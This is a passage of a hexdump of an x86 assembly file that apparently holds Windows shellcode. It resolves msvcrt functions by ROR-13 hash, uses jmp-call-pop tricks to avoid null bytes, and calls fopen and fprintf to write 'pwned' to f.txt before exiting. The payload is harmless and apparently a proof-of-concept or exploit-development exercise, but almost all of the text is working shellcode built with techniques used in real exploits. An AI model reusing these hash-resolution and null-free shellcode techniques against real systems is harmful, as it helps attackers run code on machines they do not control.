000011d0  62 70 0d 0a 63 6f 6d 70  75 74 65 5f 68 61 73 68  |bp..compute_hash|
000011e0  3a 0d 0a 20 20 20 20 78  6f 72 20 65 64 69 2c 20  |:..    xor edi, |
000011f0  65 64 69 0d 0a 20 20 20  20 78 6f 72 20 65 61 78  |edi..    xor eax|
00001200  2c 20 65 61 78 0d 0a 20  20 20 20 63 6c 64 0d 0a  |, eax..    cld..|
00001210  63 6f 6d 70 75 74 65 5f  68 61 73 68 5f 61 67 61  |compute_hash_aga|
00001220  69 6e 3a 0d 0a 20 20 20  20 6c 6f 64 73 62 0d 0a  |in:..    lodsb..|
00001230  20 20 20 20 74 65 73 74  20 61 6c 2c 20 61 6c 0d  |    test al, al.|
00001240  0a 20 20 20 20 6a 7a 20  63 6f 6d 70 75 74 65 5f  |.    jz compute_|
00001250  68 61 73 68 5f 66 69 6e  69 73 68 65 64 0d 0a 20  |hash_finished.. |
00001260  20 20 20 72 6f 72 20 65  64 69 2c 20 30 78 64 0d  |   ror edi, 0xd.|
00001270  0a 20 20 20 20 61 64 64  20 65 64 69 2c 20 65 61  |.    add edi, ea|
00001280  78 0d 0a 20 20 20 20 6a  6d 70 20 73 68 6f 72 74  |x..    jmp short|
00001290  20 63 6f 6d 70 75 74 65  5f 68 61 73 68 5f 61 67  | compute_hash_ag|
000012a0  61 69 6e 0d 0a 63 6f 6d  70 75 74 65 5f 68 61 73  |ain..compute_has|
000012b0  68 5f 66 69 6e 69 73 68  65 64 3a 0d 0a 66 69 6e  |h_finished:..fin|
000012c0  64 5f 66 75 6e 63 74 69  6f 6e 5f 63 6f 6d 70 61  |d_function_compa|
000012d0  72 65 3a 0d 0a 20 20 20  20 63 6d 70 20 65 64 69  |re:..    cmp edi|
000012e0  2c 20 5b 65 73 70 20 2b  20 30 78 32 38 5d 0d 0a  |, [esp + 0x28]..|
000012f0  20 20 20 20 6a 6e 7a 20  66 69 6e 64 5f 66 75 6e  |    jnz find_fun|
00001300  63 74 69 6f 6e 5f 6c 6f  6f 70 0d 0a 20 20 20 20  |ction_loop..    |
00001310  6d 6f 76 20 65 62 78 2c  20 5b 65 64 78 20 2b 20  |mov ebx, [edx + |
00001320  30 78 32 34 5d 0d 0a 20  20 20 20 61 64 64 20 65  |0x24]..    add e|
00001330  62 78 2c 20 65 62 70 0d  0a 20 20 20 20 6d 6f 76  |bx, ebp..    mov|
00001340  20 63 78 2c 20 5b 65 62  78 20 2b 20 32 20 2a 20  | cx, [ebx + 2 * |
00001350  65 63 78 5d 0d 0a 20 20  20 20 6d 6f 76 20 65 62  |ecx]..    mov eb|
00001360  78 2c 20 5b 65 64 78 20  2b 20 30 78 31 63 5d 0d  |x, [edx + 0x1c].|
00001370  0a 20 20 20 20 61 64 64  20 65 62 78 2c 20 65 62  |.    add ebx, eb|
00001380  70 0d 0a 20 20 20 20 6d  6f 76 20 65 61 78 2c 20  |p..    mov eax, |
00001390  5b 65 62 78 20 2b 20 34  20 2a 20 65 63 78 5d 0d  |[ebx + 4 * ecx].|
000013a0  0a 20 20 20 20 61 64 64  20 65 61 78 2c 20 65 62  |.    add eax, eb|
000013b0  70 0d 0a 20 20 20 20 6d  6f 76 20 5b 65 73 70 20  |p..    mov [esp |
000013c0  2b 20 30 78 31 63 5d 2c  20 65 61 78 0d 0a 66 69  |+ 0x1c], eax..fi|
000013d0  6e 64 5f 66 75 6e 63 74  69 6f 6e 5f 66 69 6e 69  |nd_function_fini|
000013e0  73 68 65 64 3a 0d 0a 20  20 20 20 70 6f 70 61 64  |shed:..    popad|
000013f0  0d 0a 20 20 20 20 72 65  74 0d 0a 20 0d 0a 52 65  |..    ret.. ..Re|
00001400  73 6f 6c 76 65 53 79 6d  62 6f 6c 73 46 6f 72 44  |solveSymbolsForD|
00001410  4c 4c 3a 0d 0a 20 20 20  20 6c 6f 64 73 64 0d 0a  |LL:..    lodsd..|
00001420  20 20 20 20 70 75 73 68  20 65 61 78 20 20 20 20  |    push eax    |
00001430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001440  3b 20 70 75 73 68 20 68  61 73 68 65 73 20 66 6f  |; push hashes fo|
00001450  72 20 66 69 6e 64 5f 66  75 6e 63 74 69 6f 6e 0d  |r find_function.|
00001460  0a 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |.    push edx.. |
00001470  20 20 20 63 61 6c 6c 20  66 69 6e 64 5f 66 75 6e  |   call find_fun|
00001480  63 74 69 6f 6e 0d 0a 20  20 20 20 6d 6f 76 20 5b  |ction..    mov [|
00001490  65 64 69 5d 2c 20 65 61  78 20 20 20 20 20 20 20  |edi], eax       |
000014a0  20 20 20 20 20 20 20 3b  20 73 61 76 65 20 66 6f  |       ; save fo|
000014b0  75 6e 64 20 66 75 6e 63  74 69 6f 6e 20 61 64 64  |und function add|
000014c0  72 65 73 73 0d 0a 20 20  20 20 3b 61 64 64 20 73  |ress..    ;add s|
000014d0  70 2c 20 30 78 30 38 0d  0a 20 20 20 20 61 64 64  |p, 0x08..    add|
000014e0  20 73 70 2c 20 30 78 31  30 63 20 3b 20 2b 20 32  | sp, 0x10c ; + 2|
000014f0  36 38 0d 0a 20 20 20 20  73 75 62 20 73 70 2c 20  |68..    sub sp, |
00001500  30 78 31 30 34 20 3b 20  2d 20 32 36 30 20 3d 20  |0x104 ; - 260 = |
00001510  38 0d 0a 20 20 20 20 3b  61 64 64 20 64 69 2c 20  |8..    ;add di, |
00001520  30 78 30 34 20 20 20 20  20 20 20 20 20 20 20 20  |0x04            |
00001530  20 20 20 3b 20 69 6e 63  72 65 6d 65 6e 74 20 65  |   ; increment e|
00001540  64 69 20 62 79 20 34 20  28 64 75 65 20 74 6f 20  |di by 4 (due to |
00001550  66 75 6e 63 74 69 6f 6e  20 61 64 64 72 65 73 73  |function address|
00001560  20 62 65 69 6e 67 20 73  61 76 65 64 29 0d 0a 20  | being saved).. |
00001570  20 20 20 61 64 64 20 64  69 2c 20 30 78 31 30 38  |   add di, 0x108|
00001580  20 3b 20 2b 20 32 36 34  0d 0a 20 20 20 20 73 75  | ; + 264..    su|
00001590  62 20 64 69 2c 20 30 78  31 30 34 20 3b 20 2d 20  |b di, 0x104 ; - |
000015a0  32 36 30 20 3d 20 34 0d  0a 20 20 20 20 63 6d 70  |260 = 4..    cmp|
000015b0  20 65 73 69 2c 20 65 63  78 20 20 20 20 20 20 20  | esi, ecx       |
000015c0  20 20 20 20 20 20 20 20  20 3b 20 63 68 65 63 6b  |         ; check|
000015d0  20 69 66 20 65 73 69 20  6d 65 65 74 73 20 6c 65  | if esi meets le|
000015e0  6e 67 74 68 20 6f 66 20  68 61 73 68 20 6c 69 73  |ngth of hash lis|
000015f0  74 0d 0a 20 20 20 20 6a  6e 65 20 52 65 73 6f 6c  |t..    jne Resol|
00001600  76 65 53 79 6d 62 6f 6c  73 46 6f 72 44 4c 4c 0d  |veSymbolsForDLL.|
00001610  0a 52 65 73 6f 6c 76 65  53 79 6d 62 6f 6c 73 46  |.ResolveSymbolsF|
00001620  6f 72 44 4c 4c 43 6f 6d  70 6c 65 74 65 3a 0d 0a  |orDLLComplete:..|
00001630  20 20 20 20 72 65 74 0d  0a 20 0d 0a 3b 20 3d 3d  |    ret.. ..; ==|
00001640  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00001650  3d 3d 3d 3d 20 2f 20 46  55 4e 43 54 49 4f 4e 53  |==== / FUNCTIONS|
00001660  20 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  | ===============|
00001670  3d 3d 3d 3d 3d 3d 3d 0d  0a 20 0d 0a 47 65 74 48  |=======.. ..GetH|
00001680  61 73 68 65 73 53 70 72  69 6e 67 3a 0d 0a 20 20  |ashesSpring:..  |
00001690  20 20 6a 6d 70 20 73 68  6f 72 74 20 47 65 74 48  |  jmp short GetH|
000016a0  61 73 68 65 73 20 3b 20  75 73 69 6e 67 20 61 20  |ashes ; using a |
000016b0  73 70 72 69 6e 67 20 74  6f 20 61 76 6f 69 64 20  |spring to avoid |
000016c0  6e 75 6c 6c 20 62 79 74  65 73 0d 0a 20 0d 0a 48  |null bytes.. ..H|
000016d0  61 73 68 65 73 52 65 74  75 72 6e 3a 0d 0a 20 20  |ashesReturn:..  |
000016e0  20 20 70 6f 70 20 65 73  69 0d 0a 20 20 20 20 6c  |  pop esi..    l|
000016f0  65 61 20 65 64 69 2c 20  5b 65 62 70 20 2b 20 30  |ea edi, [ebp + 0|
00001700  78 30 34 5d 0d 0a 20 20  20 20 6d 6f 76 20 65 63  |x04]..    mov ec|
00001710  78 2c 20 65 73 69 0d 0a  20 20 20 20 61 64 64 20  |x, esi..    add |
00001720  63 6c 2c 20 30 78 30 63  20 20 20 20 20 20 20 20  |cl, 0x0c        |
00001730  20 20 20 20 20 20 3b 20  6c 65 6e 67 74 68 20 6f  |      ; length o|
00001740  66 20 66 75 6e 63 74 69  6f 6e 20 68 61 73 68 20  |f function hash |
00001750  6c 69 73 74 0d 0a 20 0d  0a 20 20 20 20 63 61 6c  |list.. ..    cal|
00001760  6c 20 52 65 73 6f 6c 76  65 53 79 6d 62 6f 6c 73  |l ResolveSymbols|
00001770  46 6f 72 44 4c 4c 0d 0a  20 0d 0a 20 20 20 20 6a  |ForDLL.. ..    j|
00001780  6d 70 20 73 68 6f 72 74  20 47 65 74 46 69 6c 65  |mp short GetFile|
00001790  6e 61 6d 65 0d 0a 20 20  20 20 20 0d 0a 47 65 74  |name..     ..Get|
000017a0  48 61 73 68 65 73 3a 0d  0a 20 20 20 20 63 61 6c  |Hashes:..    cal|
000017b0  6c 20 48 61 73 68 65 73  52 65 74 75 72 6e 0d 0a  |l HashesReturn..|
000017c0  20 20 20 20 20 0d 0a 20  20 20 20 3b 20 6d 73 76  |     ..    ; msv|
000017d0  63 72 74 2e 64 6c 6c 20  68 61 73 68 20 6c 69 73  |crt.dll hash lis|
000017e0  74 0d 0a 20 20 20 20 3b  20 66 6f 70 65 6e 20 68  |t..    ; fopen h|
000017f0  61 73 68 20 3d 20 30 78  36 45 37 43 32 45 45 31  |ash = 0x6E7C2EE1|
00001800  0d 0a 20 20 20 20 64 62  20 30 78 36 45 0d 0a 20  |..    db 0x6E.. |
00001810  20 20 20 64 62 20 30 78  37 43 0d 0a 20 20 20 20  |   db 0x7C..    |
00001820  64 62 20 30 78 32 45 0d  0a 20 20 20 20 64 62 20  |db 0x2E..    db |
00001830  30 78 45 31 0d 0a 20 0d  0a 20 20 20 20 3b 20 66  |0xE1.. ..    ; f|
00001840  70 72 69 6e 74 66 20 68  61 73 68 20 3d 20 30 78  |printf hash = 0x|
00001850  31 45 33 43 33 46 44 37  0d 0a 20 20 20 20 64 62  |1E3C3FD7..    db|
00001860  20 30 78 31 45 0d 0a 20  20 20 20 64 62 20 30 78  | 0x1E..    db 0x|
00001870  33 43 0d 0a 20 20 20 20  64 62 20 30 78 33 46 0d  |3C..    db 0x3F.|
00001880  0a 20 20 20 20 64 62 20  30 78 44 37 0d 0a 20 20  |.    db 0xD7..  |
00001890  20 20 3b 20 73 69 6e 63  65 20 74 68 65 20 6d 65  |  ; since the me|
000018a0  73 73 61 67 65 20 69 73  20 73 6d 61 6c 6c 2c 20  |ssage is small, |
000018b0  6e 6f 20 6e 65 65 64 20  74 6f 20 77 6f 72 72 79  |no need to worry|
000018c0  20 61 62 6f 75 74 20 63  6c 6f 73 69 6e 67 20 74  | about closing t|
000018d0  68 65 20 66 69 6c 65 0d  0a 20 20 20 20 3b 20 6b  |he file..    ; k|
000018e0  65 65 70 20 74 68 65 20  73 68 65 6c 6c 63 6f 64  |eep the shellcod|
000018f0  65 20 73 6d 61 6c 6c 65  72 20 74 68 61 74 20 77  |e smaller that w|
00001900  61 79 2e 0d 0a 20 20 20  20 20 0d 0a 20 20 20 20  |ay...     ..    |
00001910  3b 20 65 78 69 74 20 68  61 73 68 20 3d 20 30 78  |; exit hash = 0x|
00001920  37 34 31 45 34 38 43 44  0d 0a 20 20 20 20 64 62  |741E48CD..    db|
00001930  20 30 78 37 34 0d 0a 20  20 20 20 64 62 20 30 78  | 0x74..    db 0x|
00001940  31 45 0d 0a 20 20 20 20  64 62 20 30 78 34 38 0d  |1E..    db 0x48.|
00001950  0a 20 20 20 20 64 62 20  30 78 43 44 0d 0a 20 0d  |.    db 0xCD.. .|
00001960  0a 47 65 74 46 69 6c 65  6e 61 6d 65 52 65 74 75  |.GetFilenameRetu|
00001970  72 6e 3a 0d 0a 20 20 20  20 78 6f 72 20 65 64 78  |rn:..    xor edx|
00001980  2c 20 65 64 78 20 3b 20  7a 65 72 6f 20 6f 75 74  |, edx ; zero out|
00001990  20 61 20 72 65 67 20 66  6f 72 20 6e 75 6c 6c 73  | a reg for nulls|
000019a0  0d 0a 20 0d 0a 20 20 20  20 70 6f 70 20 65 61 78  |.. ..    pop eax|
000019b0  20 3b 20 66 2e 74 78 74  0d 0a 20 20 20 20 6d 6f  | ; f.txt..    mo|
000019c0  76 20 5b 65 61 78 2b 35  5d 2c 20 64 6c 20 3b 20  |v [eax+5], dl ; |
000019d0  69 6e 73 65 72 74 20 61  20 6e 75 6c 6c 20 62 79  |insert a null by|
000019e0  74 65 2c 20 27 66 2e 74  78 74 27 0d 0a 20 20 20  |te, 'f.txt'..   |
000019f0  20 20 0d 0a 20 20 20 20  6a 6d 70 20 73 68 6f 72  |  ..    jmp shor|
00001a00  74 20 47 65 74 46 69 6c  65 4d 6f 64 65 0d 0a 20  |t GetFileMode.. |
00001a10  0d 0a 47 65 74 46 69 6c  65 4d 6f 64 65 52 65 74  |..GetFileModeRet|
00001a20  75 72 6e 3a 0d 0a 20 20  20 20 78 6f 72 20 65 64  |urn:..    xor ed|
00001a30  78 2c 20 65 64 78 20 3b  20 7a 65 72 6f 20 6f 75  |x, edx ; zero ou|
00001a40  74 20 61 20 72 65 67 20  66 6f 72 20 6e 75 6c 6c  |t a reg for null|
00001a50  73 0d 0a 20 0d 0a 20 20  20 20 70 6f 70 20 65 63  |s.. ..    pop ec|
00001a60  78 20 3b 20 77 0d 0a 20  20 20 20 6d 6f 76 20 5b  |x ; w..    mov [|
00001a70  65 63 78 2b 31 5d 2c 20  64 6c 20 3b 20 69 6e 73  |ecx+1], dl ; ins|
00001a80  65 72 74 20 61 20 6e 75  6c 6c 20 62 79 74 65 2c  |ert a null byte,|
00001a90  20 27 77 27 0d 0a 20 0d  0a 20 20 20 20 6a 6d 70  | 'w'.. ..    jmp|
00001aa0  20 73 68 6f 72 74 20 47  65 74 66 6f 70 65 6e 43  | short GetfopenC|
00001ab0  61 6c 6c 20 3b 20 4e 6f  77 20 6a 75 6d 70 20 74  |all ; Now jump t|
00001ac0  6f 20 66 6f 70 65 6e 20  63 61 6c 6c 0d 0a 20 20  |o fopen call..  |
00001ad0  20 20 20 0d 0a 66 6f 70  65 6e 43 61 6c 6c 3a 20  |   ..fopenCall: |
00001ae0  0d 0a 20 20 20 20 70 75  73 68 20 65 63 78 20 3b  |..    push ecx ;|
00001af0  20 27 77 27 0d 0a 20 20  20 20 70 75 73 68 20 65  | 'w'..    push e|
00001b00  61 78 20 3b 20 70 75 73  68 20 27 66 2e 74 78 74  |ax ; push 'f.txt|
00001b10  27 0d 0a 20 20 20 20 63  61 6c 6c 20 5b 65 62 70  |'..    call [ebp|
00001b20  2b 34 5d 3b 20 63 61 6c  6c 20 66 6f 70 65 6e 0d  |+4]; call fopen.|
00001b30  0a 20 20 20 20 20 0d 0a  20 20 20 20 6a 6d 70 20  |.     ..    jmp |
00001b40  73 68 6f 72 74 20 47 65  74 66 70 72 69 6e 74 66  |short Getfprintf|
00001b50  44 61 74 61 0d 0a 20 0d  0a 47 65 74 66 70 72 69  |Data.. ..Getfpri|
00001b60  6e 74 66 44 61 74 61 52  65 74 75 72 6e 3a 0d 0a  |ntfDataReturn:..|
00001b70  20 20 20 20 78 6f 72 20  65 64 78 2c 20 65 64 78  |    xor edx, edx|
00001b80  20 3b 20 7a 65 72 6f 20  6f 75 74 20 61 20 72 65  | ; zero out a re|
00001b90  67 20 66 6f 72 20 61 20  6e 75 6c 6c 0d 0a 20 0d  |g for a null.. .|
00001ba0  0a 20 20 20 20 70 6f 70  20 65 63 78 20 3b 20 70  |.    pop ecx ; p|
00001bb0  75 73 68 20 64 61 74 61  20 73 74 72 69 6e 67 0d  |ush data string.|
00001bc0  0a 20 20 20 20 6d 6f 76  20 5b 65 63 78 2b 35 5d  |.    mov [ecx+5]|
00001bd0  2c 20 64 6c 20 3b 20 69  6e 73 65 72 74 20 61 20  |, dl ; insert a |
00001be0  6e 75 6c 6c 20 62 79 74  65 0d 0a 20 20 20 20 20  |null byte..     |
00001bf0  0d 0a 20 20 20 20 6a 6d  70 20 73 68 6f 72 74 20  |..    jmp short |
00001c00  47 65 74 66 70 72 69 6e  74 66 43 61 6c 6c 0d 0a  |GetfprintfCall..|
00001c10  20 0d 0a 66 70 72 69 6e  74 66 43 61 6c 6c 3a 20  | ..fprintfCall: |
00001c20  20 20 0d 0a 20 20 20 20  70 75 73 68 20 65 63 78  |  ..    push ecx|
00001c30  20 3b 20 64 61 74 61 0d  0a 20 20 20 20 70 75 73  | ; data..    pus|
00001c40  68 20 65 61 78 20 3b 20  68 61 6e 64 6c 65 0d 0a  |h eax ; handle..|
00001c50  20 20 20 20 20 0d 0a 20  20 20 20 6d 6f 76 20 65  |     ..    mov e|
00001c60  73 69 2c 20 65 61 78 20  3b 20 77 65 20 77 61 6e  |si, eax ; we wan|
00001c70  74 20 74 6f 20 6b 65 65  70 20 74 68 65 20 68 61  |t to keep the ha|
00001c80  6e 64 6c 65 20 66 6f 72  20 63 6c 6f 73 65 0d 0a  |ndle for close..|
00001c90  20 20 20 20 20 0d 0a 20  20 20 20 63 61 6c 6c 20  |     ..    call |
00001ca0  5b 65 62 70 2b 38 5d 20  3b 20 63 61 6c 6c 20 66  |[ebp+8] ; call f|
00001cb0  70 72 69 6e 74 66 0d 0a  20 0d 0a 3b 20 49 74 20  |printf.. ..; It |
00001cc0  6e 65 65 64 73 20 74 6f  20 65 69 74 68 65 72 20  |needs to either |
00001cd0  65 78 69 74 2c 20 6f 72  20 63 61 6c 6c 20 66 63  |exit, or call fc|
00001ce0  6c 6f 73 65 20 74 6f 20  77 72 69 74 65 20 74 68  |lose to write th|
00001cf0  65 20 62 75 66 66 65 72  20 74 6f 20 66 69 6c 65  |e buffer to file|
00001d00  2e 0d 0a 45 78 69 74 50  72 6f 63 65 73 73 43 61  |...ExitProcessCa|
00001d10  6c 6c 3a 0d 0a 20 20 20  20 70 75 73 68 20 65 62  |ll:..    push eb|
00001d20  78 20 3b 20 65 62 78 20  68 61 73 20 30 30 30 30  |x ; ebx has 0000|
00001d30  34 30 30 30 20 69 6e 20  69 74 20 2d 20 77 68 6f  |4000 in it - who|
00001d40  20 63 61 72 65 73 20 77  68 61 74 20 77 65 20 67  | cares what we g|
00001d50  69 76 65 20 65 78 69 74  3f 0d 0a 20 0d 0a 20 20  |ive exit?.. ..  |
00001d60  20 20 63 61 6c 6c 20 5b  65 62 70 2b 30 78 30 63  |  call [ebp+0x0c|
00001d70  5d 20 3b 20 65 78 69 74  0d 0a 20 0d 0a 47 65 74  |] ; exit.. ..Get|
00001d80  46 69 6c 65 6e 61 6d 65  3a 0d 0a 20 20 20 20 63  |Filename:..    c|
00001d90  61 6c 6c 20 47 65 74 46  69 6c 65 6e 61 6d 65 52  |all GetFilenameR|
00001da0  65 74 75 72 6e 0d 0a 20  20 20 20 64 62 20 27 66  |eturn..    db 'f|
00001db0  2e 74 78 74 4e 27 20 3b  20 66 69 6c 65 6e 61 6d  |.txtN' ; filenam|
00001dc0  65 0d 0a 20 0d 0a 47 65  74 46 69 6c 65 4d 6f 64  |e.. ..GetFileMod|
00001dd0  65 3a 0d 0a 20 20 20 20  63 61 6c 6c 20 47 65 74  |e:..    call Get|
00001de0  46 69 6c 65 4d 6f 64 65  52 65 74 75 72 6e 0d 0a  |FileModeReturn..|
00001df0  20 20 20 20 64 62 20 27  77 4e 27 20 3b 20 66 69  |    db 'wN' ; fi|
00001e00  6c 65 20 61 63 63 65 73  73 20 6d 6f 64 65 0d 0a  |le access mode..|
00001e10  20 0d 0a 47 65 74 66 6f  70 65 6e 43 61 6c 6c 3a  | ..GetfopenCall:|
00001e20  0d 0a 20 20 20 20 63 61  6c 6c 20 66 6f 70 65 6e  |..    call fopen|
00001e30  43 61 6c 6c 0d 0a 20 0d  0a 47 65 74 66 70 72 69  |Call.. ..Getfpri|
00001e40  6e 74 66 44 61 74 61 3a  0d 0a 20 20 20 20 63 61  |ntfData:..    ca|
00001e50  6c 6c 20 47 65 74 66 70  72 69 6e 74 66 44 61 74  |ll GetfprintfDat|
00001e60  61 52 65 74 75 72 6e 0d  0a 20 20 20 20 64 62 20  |aReturn..    db |
00001e70  27 70 77 6e 65 64 4e 27  20 3b 20 64 61 74 61 20  |'pwnedN' ; data |
00001e80  74 6f 20 62 65 20 77 72  69 74 74 65 6e 20 74 6f  |to be written to|
00001e90  20 66 69 6c 65 0d 0a 20  0d 0a 47 65 74 66 70 72  | file.. ..Getfpr|
00001ea0  69 6e 74 66 43 61 6c 6c  3a 0d 0a 20 20 20 20 63  |intfCall:..    c|
00001eb0  61 6c 6c 20 66 70 72 69  6e 74 66 43 61 6c 6c     |all fprintfCall|
00001ebf
